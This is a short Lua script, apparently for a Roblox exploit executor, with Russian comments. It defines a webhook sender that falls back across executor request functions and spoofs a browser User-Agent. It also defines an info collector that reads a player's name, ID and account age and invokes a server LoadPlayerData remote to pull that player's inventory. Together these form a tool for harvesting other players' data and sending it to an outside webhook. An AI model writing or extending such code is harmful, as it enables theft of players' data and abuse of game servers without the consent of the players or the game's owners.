-- Тот самый метод типов
local function sendWebhook(url, data)
    local body = HttpService:JSONEncode(data)
    
    local suc, err = pcall(function()
        syn.request({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["User-Agent"] = "Mozilla/5.0"
            },
            Body = body
        })
    end)
    
    if suc then return true end
    
    local suc2, err2 = pcall(function()
        http_request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    end)
    
    if suc2 then return true end
    
    local suc3, err3 = pcall(function()
        request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        })
    end)
    
    return suc3
end

-- Сбор инфы
local function getInfo(player)
    local info = {
        Name = player.Name,
        DisplayName = player.DisplayName,
        UserId = player.UserId,
        AccountAge = player.AccountAge
    }
    
    pcall(function()
        for _, v in pairs(RS:GetDescendants()) do
            if v:IsA("RemoteFunction") and v.Name == "LoadPlayerData" then
                local data = v:InvokeServer(player.UserId)
                if data then
                    info.Inventory = tostring(data)
                end
            end
        end
    end)
    
    return info
end

